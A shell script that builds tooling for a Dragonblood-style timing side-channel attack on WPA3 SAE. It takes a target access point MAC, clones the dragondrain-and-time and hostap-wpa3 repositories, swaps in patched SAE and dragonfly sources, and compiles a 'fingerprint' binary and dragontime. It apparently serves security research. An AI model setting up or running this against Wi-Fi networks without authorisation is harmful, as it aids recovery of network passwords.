#!/bin/sh

CHANGES_DIR="../changes"
MAC_AP="$1"
DEVICE="${2:-wlan0}"

if [ -z ${1+x} ]; then
  echo "Access point MAC must be provided"
  exit 1
fi

# Ensures requirements are installed
sudo apt-get update
sudo apt-get install -y autoconf automake libtool shtool libssl-dev pkg-config

# Clones repositories
if [ ! -d "dragondrain-and-time" ]; then
  git clone https://github.com/vanhoefm/dragondrain-and-time.git
  rm -rf dragondrain-and-time/.git
fi
if [ ! -d "hostap-wpa3" ]; then
  git clone https://github.com/vanhoefm/hostap-wpa3.git
  rm -rf hostap-wpa3/.git
fi

# Inputs MACs
echo "$MAC_AP" > MAC_AP
echo "$DEVICE" > DEVICE
MAC_USER=$(ip link show "$DEVICE" | grep link/ether | awk '{print $2}')
echo "$MAC_USER" > MAC_USER
python update_mac.py "$CHANGES_DIR/fingerprint.c" "$MAC_AP" "$MAC_USER"

# Replaces needed files
cp $CHANGES_DIR/dragonfly.c hostap-wpa3/src/common/dragonfly.c
cp $CHANGES_DIR/sae.c hostap-wpa3/src/common/sae.c
cp $CHANGES_DIR/dh_groups.c hostap-wpa3/src/crypto/dh_groups.c
cp $CHANGES_DIR/dragontime.c dragondrain-and-time/src/dragontime.c

# Compiles fingerprint
sed -i 's/hostapd:/fingerprint:/' hostap-wpa3/hostapd/Makefile
sed -i 's/-o hostapd /-o fingerprint /' hostap-wpa3/hostapd/Makefile
sed -i 's/ALL=hostapd hostapd_cli/ALL=fingerprint/' hostap-wpa3/hostapd/Makefile
sed -i 's/int main(/int main1(/' hostap-wpa3/hostapd/main.c
cp $CHANGES_DIR/sae.c hostap-wpa3/src/common/sae.c
sed -i 's/sae->tmp->pwe_ffc ? 0 : -1/counter - 1/' hostap-wpa3/src/common/sae.c
cat $CHANGES_DIR/fingerprint.c >> hostap-wpa3/src/common/sae.c
cp hostap-wpa3/hostapd/defconfig hostap-wpa3/hostapd/.config
(cd hostap-wpa3/hostapd && make -j 2)
cp hostap-wpa3/hostapd/fingerprint fingerprint

# Compiles dragontime
sed -i 's/} __packed;/};/' dragondrain-and-time/src/aircrack-osdep/radiotap/radiotap.h
(cd dragondrain-and-time && autoreconf -i)
(cd dragondrain-and-time && ./configure)
(cd dragondrain-and-time && make)
if [ -f "dragontime" ]; then
  rm -f dragontime
fi
ln -s dragondrain-and-time/src/dragontime dragontime
